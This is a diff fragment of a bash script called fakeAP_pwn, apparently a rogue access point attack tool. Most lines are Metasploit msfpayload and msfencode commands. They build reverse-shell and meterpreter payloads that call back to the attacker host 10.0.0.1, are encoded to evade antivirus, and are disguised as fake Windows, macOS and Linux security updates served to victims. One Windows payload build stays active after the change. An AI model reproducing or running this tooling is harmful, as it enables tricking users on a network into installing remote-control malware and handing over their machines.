 		AllowOverride None
 		Order allow,deny
@@ -522,18 +625,20 @@ if [ "$verbose" == "2" ] ; then echo "[i] Created: /etc/apache2/sites-available/
 if [ "$debug" == "true" ]; then cat /etc/apache2/sites-available/fakeAP_pwn; fi
 
 #echo -e "\e[01;32m[>]\e[00m Creating exploit.(Linux)"
-#if [ "$verbose" == "2" ] ; then echo "[i] Command: $metasploitPath/msfpayload linux/x86/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4566 X > $htdocs_folder/kernal_1.83.90-5+lenny2_i386.deb"; fi
-#xterm -geometry 75x10+10+100 -T "fakeAP_pwn v$version - Metasploit (Linux)" -e "$metasploitPath/msfpayload linux/x86/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4566 X > $htdocs_folder/kernal_1.83.90-5+lenny2_i386.deb"
+#if [ "$verbose" == "2" ] ; then echo "[i] Command: $metasploitPath/msfpayload linux/x86/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4566 X > $htdocsPath/kernal_1.83.90-5+lenny2_i386.deb"; fi
+#xterm -geometry 75x10+10+100 -T "fakeAP_pwn v$version - Metasploit (Linux)" -e "$metasploitPath/msfpayload linux/x86/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4566 X > $htdocsPath/kernal_1.83.90-5+lenny2_i386.deb"
 #echo -e "\e[01;32m[>]\e[00m Creating exploit..(OSX)"
-#if [ "$verbose" == "2" ] ; then echo "[i] Command: $metasploitPath/msfpayload osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 X > $htdocs_folder/SecurityUpdate1-83-90-5.dmg.bin"; fi
-#xterm -geometry 75x10+10+110 -T "fakeAP_pwn v$version - Metasploit (OSX)" -e "$metasploitPath/msfpayload osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 X > $htdocs_folder/SecurityUpdate1-83-90-5.dmg.bin"
+#if [ "$verbose" == "2" ] ; then echo "[i] Command: $metasploitPath/msfpayload osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 X > $htdocsPath/SecurityUpdate1-83-90-5.dmg.bin"; fi
+#xterm -geometry 75x10+10+110 -T "fakeAP_pwn v$version - Metasploit (OSX)" -e "$metasploitPath/msfpayload osx/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4565 X > $htdocsPath/SecurityUpdate1-83-90-5.dmg.bin"
 echo -e "\e[01;32m[>]\e[00m Creating exploit...(Windows)"
-#if [ "$verbose" == "2" ] ; then echo "[i] Command: $metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 X > $htdocs_folder/Windows-KB183905-x86-ENU.exe"; fi
-#$xterm -geometry 75x15+10+0 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e "$metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 X > $htdocs_folder/Windows-KB183905-x86-ENU.exe"
-#if [ "$verbose" == "2" ] ; then echo "[i] Command: $metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | $metasploitPath/msfencode -e x86/shikata_ga_nai -c 5 -t raw | $metasploitPath/msfencode -e x86/countdown -c 2 -t raw | $metasploitPath/msfencode -e x86/shikata_ga_nai -c 5 -t raw | $metasploitPath/msfencode -x $htdocs_folder/sbd.exe -t exe -e x86/call4_dword_xor -c 2 -o $htdocs_folder/Windows-KB183905-x86-ENU.exe"; fi
-#$xterm -geometry 75x15+10+0 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e "$metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | $metasploitPath/msfencode -e x86/shikata_ga_nai -c 5 -t raw | $metasploitPath/msfencode -e x86/countdown -c 2 -t raw | $metasploitPath/msfencode -e x86/shikata_ga_nai -c 5 -t raw | $metasploitPath/msfencode -x $htdocs_folder/sbd.exe -t exe -e x86/call4_dword_xor -c 2 -o $htdocs_folder/Windows-KB183905-x86-ENU.exe"
-if [ "$verbose" == "2" ] ; then echo "[i] Command: $metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | $metasploitPath/msfencode -x $htdocs_folder/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $htdocs_folder/Windows-KB183905-x86-ENU.exe"; fi
-$xterm -geometry 75x15+10+0 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e "$metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | $metasploitPath/msfencode -x $htdocs_folder/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $htdocs_folder/Windows-KB183905-x86-ENU.exe"
+#if [ "$verbose" == "2" ] ; then echo "[i] Command: $metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 X > $htdocsPath/Windows-KB183905-x86-ENU.exe"; fi
+#$xterm -geometry 75x15+10+0 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e "$metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 X > $htdocsPath/Windows-KB183905-x86-ENU.exe"
+#if [ "$verbose" == "2" ] ; then echo "[i] Command: $metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | $metasploitPath/msfencode -e x86/shikata_ga_nai -c 5 -t raw | $metasploitPath/msfencode -e x86/countdown -c 2 -t raw | $metasploitPath/msfencode -e x86/shikata_ga_nai -c 5 -t raw | $metasploitPath/msfencode -x $htdocsPath/sbd.exe -t exe -e x86/call4_dword_xor -c 2 -o $htdocsPath/Windows-KB183905-x86-ENU.exe"; fi
+#$xterm -geometry 75x15+10+0 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e "$metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | $metasploitPath/msfencode -e x86/shikata_ga_nai -c 5 -t raw | $metasploitPath/msfencode -e x86/countdown -c 2 -t raw | $metasploitPath/msfencode -e x86/shikata_ga_nai -c 5 -t raw | $metasploitPath/msfencode -x $htdocsPath/sbd.exe -t exe -e x86/call4_dword_xor -c 2 -o $htdocsPath/Windows-KB183905-x86-ENU.exe"
+if [ "$verbose" == "2" ] ; then echo "[i] Command: $metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | $metasploitPath/msfencode -x $htdocsPath/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $htdocsPath/Windows-KB183905-x86-ENU.exe"; fi
+$xterm -geometry 75x15+10+0 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e "$metasploitPath/msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | $metasploitPath/msfencode -x $htdocsPath/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $htdocsPath/Windows-KB183905-x86-ENU.exe"
+#if [ "$verbose" == "2" ] ; then echo "[i] Command: $metasploitPath/msfpayload windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | $metasploitPath/msfencode -x $htdocsPath/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $htdocsPath/Windows-KB183905-x64-ENU.exe"; fi
+#$xterm -geometry 75x15+10+0 -T "fakeAP_pwn v$version - Metasploit (Windows)" -e "$metasploitPath/msfpayload windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4564 R | $metasploitPath/msfencode -x $htdocsPath/sbd.exe -t exe -e x86/shikata_ga_nai -c 10 -o $htdocsPath/Windows-KB183905-x64-ENU.exe"
 
 echo -e "\e[01;32m[>]\e[00m Creating our fake access point..."
 if [ "$respond2All" == "true" ]; then
